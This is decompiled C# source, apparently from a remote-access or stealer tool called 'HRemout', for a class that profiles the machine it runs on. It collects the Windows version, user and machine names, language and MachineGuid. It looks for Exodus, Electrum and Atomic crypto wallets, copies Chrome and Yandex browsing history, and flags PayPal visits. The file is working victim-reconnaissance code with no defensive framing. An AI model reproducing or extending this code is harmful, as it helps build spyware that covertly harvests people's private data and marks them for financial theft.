using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Management;
using Microsoft.Win32;

namespace HRemout.UserInFo;

internal class GetINFo
{
	public static int Winv;

	public static string WindowsVersion()
	{
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0157: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string name = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion";
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name);
			if (Environment.Is64BitOperatingSystem)
			{
				if (registryKey.GetValue("ProductName")!.ToString()!.Contains("7"))
				{
					Winv = 7;
				}
				if (registryKey.GetValue("ProductName")!.ToString()!.Contains("8"))
				{
					Winv = 8;
				}
				if (registryKey.GetValue("ProductName")!.ToString()!.Contains("10"))
				{
					Winv = 10;
				}
				return registryKey.GetValue("ProductName")!.ToString() + "(x64)";
			}
			if (registryKey.GetValue("ProductName")!.ToString()!.Contains("7"))
			{
				Winv = 7;
			}
			if (registryKey.GetValue("ProductName")!.ToString()!.Contains("8"))
			{
				Winv = 8;
			}
			if (registryKey.GetValue("ProductName")!.ToString()!.Contains("10"))
			{
				Winv = 10;
			}
			return registryKey.GetValue("ProductName")!.ToString() + "(x32)";
		}
		catch
		{
			try
			{
				string text = string.Empty;
				ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						text = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Caption").ToString();
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (text.Contains("7"))
				{
					Winv = 7;
				}
				if (text.Contains("8"))
				{
					Winv = 8;
				}
				if (text.Contains("10"))
				{
					Winv = 10;
				}
				return text;
			}
			catch
			{
				return "undetect";
			}
		}
	}

	public static string userNameAndMachine()
	{
		try
		{
			string userName = Environment.UserName;
			return Environment.MachineName + "(" + userName + ")";
		}
		catch
		{
			return Environment.UserName;
		}
	}

	public static string language()
	{
		try
		{
			return CultureInfo.InstalledUICulture.EnglishName;
		}
		catch
		{
			return "error";
		}
	}

	public static string DetectV2()
	{
		try
		{
			string text = "";
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			foreach (string path in directories)
			{
				if (Path.GetFileName(path) == "Exodus" || Path.GetFileName(path) == "Electrum" || Path.GetFileName(path) == "atomic")
				{
					text += "CryptoAPP";
					break;
				}
			}
			directories = Directory.GetDirectories(folderPath);
			foreach (string path2 in directories)
			{
				if (Path.GetFileName(path2) == "Google")
				{
					string sourceFileName = folderPath + "//Google//Chrome//User Data//Default//History";
					string text2 = Path.GetTempPath() + "//goog" + new Random().Next(100, 900);
					File.Copy(sourceFileName, text2);
					text = File.ReadAllText(text2);
					File.Delete(text2);
				}
				if (Path.GetFileName(path2) == "Yandex")
				{
					string sourceFileName2 = folderPath + "//Yandex//YandexBrowser//User Data//Default//History";
					string text3 = Path.GetTempPath() + "//Yad" + new Random().Next(100, 900);
					File.Copy(sourceFileName2, text3);
					text = File.ReadAllText(text3);
					File.Delete(text3);
				}
			}
			return text;
		}
		catch
		{
			return "error";
		}
	}

	public static string Detect()
	{
		try
		{
			string text = "";
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			foreach (string path in directories)
			{
				if (Path.GetFileName(path) == "Exodus" || Path.GetFileName(path) == "Electrum" || Path.GetFileName(path) == "atomic")
				{
					text += "CryptoAPP";
					break;
				}
			}
			directories = Directory.GetDirectories(folderPath);
			foreach (string path2 in directories)
			{
				if (Path.GetFileName(path2) == "Google")
				{
					string sourceFileName = folderPath + "//Google//Chrome//User Data//Default//History";
					string text2 = Path.GetTempPath() + "//goog" + new Random().Next(100, 900);
					File.Copy(sourceFileName, text2);
					if (File.ReadAllText(text2).Contains("paypal"))
					{
						text += ",Gpaypal";
					}
					File.Delete(text2);
				}
				if (Path.GetFileName(path2) == "Yandex")
				{
					string sourceFileName2 = folderPath + "//Yandex//YandexBrowser//User Data//Default//History";
					string text3 = Path.GetTempPath() + "//Yad" + new Random().Next(100, 900);
					File.Copy(sourceFileName2, text3);
					if (File.ReadAllText(text3).Contains("paypal"))
					{
						text += ",Ypaypal";
					}
					File.Delete(text3);
				}
			}
			return text;
		}
		catch
		{
			return "nul";
		}
	}

	public static string GetMachineGuid()
	{
		string text = "SOFTWARE\\Microsoft\\Cryptography";
		string text2 = "MachineGuid";
		using RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
		using RegistryKey registryKey2 = registryKey.OpenSubKey(text);
		if (registryKey2 == null)
		{
			throw new KeyNotFoundException($"Key Not Found: {text}");
		}
		return (registryKey2.GetValue(text2) ?? throw new IndexOutOfRangeException($"Index Not Found: {text2}"))!.ToString();
	}
}
